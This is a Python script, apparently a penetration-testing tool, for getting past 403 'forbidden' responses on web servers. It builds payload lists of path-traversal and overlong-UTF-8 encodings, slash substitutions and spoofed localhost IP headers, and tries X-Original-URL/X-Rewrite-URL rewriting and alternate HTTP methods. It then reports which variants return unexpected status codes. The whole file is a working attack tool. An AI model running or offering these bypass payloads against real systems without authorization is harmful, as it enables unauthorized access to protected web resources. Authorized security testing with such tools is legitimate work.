import requests
import re
import argparse

first = ["%2e/", "%252e/", "%2e%2f", "%2e%c0%af", "%252e%c0%af"]
pre_path = ["..;/", "%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
past_path = ["pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa%c1%9clupa%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c", "/"]
replace_slash = ["?", "??", "\\", "/\".hithere", "..;/"]
headers = [{ 'X-Custom-IP-Authorization': "127.0.0.1" },
           { 'X-Originationg-IP': "127.0.0.1" },
           { 'X-Forwarded-For': "127.0.0.1" },
           { 'X-Remote-IP': "127.0.0.1" },
           { 'X-Client-IP': "127.0.0.1" },
           { 'X-Host': "127.0.0.1" },
           { 'X-Forwarded-Host': "127.0.0.1" }]
response_codes = {}
to_ignore = [400, 403, 404]
timeout = 10
cookie = ""
data = ""
reqtype = "get"

def get_args():
    global timeout
    global cookie
    global data
    global reqtype
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="target", help="Target url")
    parser.add_argument("-f", dest="targets", help="File with target urls")
    parser.add_argument("-t", dest="timeout", type=float, help="Timeout")
    parser.add_argument("-r", dest="reqtype", help="Request type")
    parser.add_argument("-c", "--cookie", dest="cookie", help="Cookie")
    parser.add_argument("-d", "--data", dest="data", help="Request body")
    arguments = parser.parse_args()

    if not arguments.target and not arguments.targets:
        parser.error("[-] Error: null target")

    if arguments.timeout:
        timeout = arguments.timeout

    if arguments.cookie:
        cookie = arguments.cookie

    if arguments.data:
        data = arguments.data

    if arguments.reqtype:
        reqtype = arguments.reqtype
    
    return arguments

def through_file(fname):
    try: 
        with open(fname, 'r') as f:
            for line in f:
                directory_test(line);
    except:
        print("[-] Error: Unable to open file {}".format(fname))

def print_status_codes():
    for code in response_codes:
        print("[{}] - {} times".format(code, response_codes[code]))

def get_last(url):
    parts = re.search('(.+)(\/.+)$', url)
    return parts.group(1), parts.group(2)

def get_host(url):
    slash = re.search('(.+\..+?\/)(.*)', url)
    return slash.group(1), slash.group(2)

def rewrite_url_test(host, rest):
    content_length = len(access_test(host, "get", {}, False).content)
    if content_length != len(access_test(host, "get", {}, False).content):
        print("{} url content is not stable".format(host))
        return
    # X-Rewrite-URL header
    response = access_test(host, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }, False)
    if len(response.content) != content_length:
        print("\nContent-length differ on {} with {} request and header {}".format(host, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }))
    # X-Original-URL header        
    response = access_test(host, "get", { 'X-Original-URL': '/{}'.format(rest) }, False)
    if len(response.content) != content_length:
        print("\nContent-length differ on {} with {} request and header {}".format(host, "get", { 'X-Original-URL': '/{}'.format(rest) }))    

def basic_tests(url, host, rest, butlast):
    requests_list = ["post", "head", "options", "put", "patch"]
    
    for req in requests_list:
        access_test(url, req)
    for header in headers:
        access_test(url, reqtype, header)
    access_test(url, reqtype, { 'Referer': butlast })
    
    if reqtype == "get":
        rewrite_url_test(host, rest)

def directory_test(url):
    directory = True if url[-1] is '/' else False
    path, last = get_last(url)
    host, rest = get_host(url)

    print("[Testing] {}".format(url))
    basic_tests(url, host, rest, path)

    if url[-1] is '/':
        url = url[:-1]

    for f in first:
        access_test(url.replace(host, host + f))

    for p in past_path:
            access_test(url + "/" + p)

    for r in replace_slash:
            access_test(url + r)

    for pre in pre_path:
        npath = path + "/" + last.replace('/', pre)
        if directory:
            npath = npath + "/"
        access_test(npath)

def request(path, rtype = reqtype, h = {}):
    global timeout
    global data
    if len(h) == 0:
        h = ""
    if rtype == "get":
        response = requests.get(path, headers=h, timeout=timeout)
    elif rtype == "post":
        if data == "":
            h['Content-Length'] = '0'
        response = requests.post(path, timeout=timeout, data=data, headers=h)
    elif rtype == "put":
        response = requests.put(path, timeout=timeout, data=data, headers=h)
    elif rtype == "patch":
        response = requests.patch(path, timeout=timeout, data=data, headers=h)
    elif rtype == "head":
        response = requests.head(path, timeout=timeout, headers=h)
    elif rtype == "options":
        response = requests.options(path, timeout=timeout, headers=h)
    else:
        return "error"
    return response

def access_test(path, rtype = reqtype, h = {}, output = True):
    global cookie 
    if cookie != "":
        h['Cookie'] = cookie
    try:
        response = request(path, rtype, h)        
        sc = response.status_code
        if output:
            if sc not in to_ignore:
                if h is not "":
                    print("\n[{}] {} with {} request and header {}".format(response.status_code, path, rtype, h))
                else:
                    print("\n[{}] {} with {} request".format(response.status_code, path, rtype))
            if response.status_code not in response_codes:
                response_codes[response.status_code] = 1
            else:
                response_codes[response.status_code] += 1
        return response
    except Exception as e:
        print(e)

def main():
    args = get_args()
    try:
        if args.target:
            directory_test(args.target)
        else:
            through_file(args.targets)            
        print("Done\nResponses:")
        print_status_codes()
    except KeyboardInterrupt:
        print_status_codes()
        print("\nAborted\n")
        
if __name__ == "__main__":
    main()
